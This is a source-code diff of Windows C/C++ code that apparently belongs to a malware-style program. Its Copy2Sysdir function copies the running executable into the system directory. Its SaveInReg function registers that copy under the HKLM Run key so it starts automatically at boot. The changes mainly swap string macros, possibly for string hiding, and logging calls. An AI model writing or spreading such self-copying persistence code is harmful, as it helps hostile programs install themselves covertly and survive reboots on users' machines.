@@ -1,8 +1,8 @@
-#include "Tools.h"
+#include "pch.h"
+
+#include "Tools.hpp"
 #include "Constants.h"
 #include "Debugger.h"
-
-#include <io.h>
 
 BOOL FileExist(CONST PTCHAR filename)
 {
@@ -37,7 +37,7 @@ BOOL Copy2Sysdir(CONST PTCHAR appname)
 	HMODULE hModule = NULL;
 	if(!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, NULL, &hModule))
 	{
-		PrintError(TEXT("GetModuleHandleEx"), GetLastError());
+		PrintError(TEXTH("GetModuleHandleEx"), GetLastError());
 
 		return FALSE;
 	}
@@ -45,7 +45,7 @@ BOOL Copy2Sysdir(CONST PTCHAR appname)
 	TCHAR filepath[SMALL_BUFFER_LENGTH] = { 0 };
 	if (!GetModuleFileName(hModule, filepath, SMALL_BUFFER_LENGTH))
 	{
-		PrintError(TEXT("GetModuleFileName"), GetLastError());
+		PrintError(TEXTH("GetModuleFileName"), GetLastError());
 
 		return FALSE;
 	}
@@ -54,7 +54,7 @@ BOOL Copy2Sysdir(CONST PTCHAR appname)
 	errno_t code = _tcscat_s(filename, SMALL_BUFFER_LENGTH, appname);
 	if (code != 0)
 	{
-		_tprintf(TEXT("Cannot construct filename, error: %d"), code);
+		$ERROR(TEXTH("Cannot construct filename, error: %d"), code);
 
 		return FALSE;
 	}
@@ -62,7 +62,7 @@ BOOL Copy2Sysdir(CONST PTCHAR appname)
 	TCHAR sysdir[SMALL_BUFFER_LENGTH] = { 0 };
 	if (!GetSystemDirectory(sysdir, SMALL_BUFFER_LENGTH))
 	{
-		PrintError(TEXT("GetSystemDirectory"), GetLastError());
+		PrintError(TEXTH("GetSystemDirectory"), GetLastError());
 
 		return FALSE;
 	}
@@ -70,7 +70,7 @@ BOOL Copy2Sysdir(CONST PTCHAR appname)
 	code = _tcscat_s(sysdir, SMALL_BUFFER_LENGTH, filename);
 	if (code != 0)
 	{
-		_tprintf(TEXT("Cannot construct sysdir path, error: %d"), code);
+		$ERROR(TEXT("Cannot construct sysdir path, error: %d"), code);
 
 		return FALSE;
 	}
@@ -79,7 +79,7 @@ BOOL Copy2Sysdir(CONST PTCHAR appname)
 	if(!FileExist(sysdir))
 		if (!CopyFileEx(filepath, sysdir, NULL, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS))
 		{
-			PrintError(TEXT("CopyFile"), GetLastError());
+			PrintError(TEXTH("CopyFile"), GetLastError());
 
 			return FALSE;
 		}                        
@@ -101,7 +101,7 @@ BOOL SaveInReg(CONST PTCHAR appname)
 	TCHAR sysdir[SMALL_BUFFER_LENGTH] = { 0 };
 	if (!GetSystemDirectory(sysdir, SMALL_BUFFER_LENGTH))
 	{
-		PrintError(TEXT("GetSystemDirectory"), GetLastError());
+		PrintError(TEXTH("GetSystemDirectory"), GetLastError());
 
 		return FALSE;
 	}
@@ -117,23 +117,23 @@ BOOL SaveInReg(CONST PTCHAR appname)
 	HKEY hKey = NULL;
 	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0ul, KEY_WRITE, &hKey) != ERROR_SUCCESS)
 	{
-		PrintError(TEXT("RegOpenKeyEx"), GetLastError());
+		PrintError(TEXTH("RegOpenKeyEx"), GetLastError());
 
 		return FALSE;
 	}
 
 	if (RegSetValueEx(hKey, appname, 0ul, REG_EXPAND_SZ, (BYTE*)sysdir, SMALL_BUFFER_LENGTH) != ERROR_SUCCESS)
 	{
-		PrintError(TEXT("RegSetValueEx"), GetLastError());
+		PrintError(TEXTH("RegSetValueEx"), GetLastError());
 		if (RegCloseKey(hKey) != ERROR_SUCCESS)
-			PrintError(TEXT("RegCloseKey"), GetLastError());
+			PrintError(TEXTH("RegCloseKey"), GetLastError());
 
 		return FALSE;
 	}
 
 	if (RegCloseKey(hKey) != ERROR_SUCCESS)
 	{
-		PrintError(TEXT("RegCloseKey"), GetLastError());
+		PrintError(TEXTH("RegCloseKey"), GetLastError());
 
 		return FALSE;
 	}
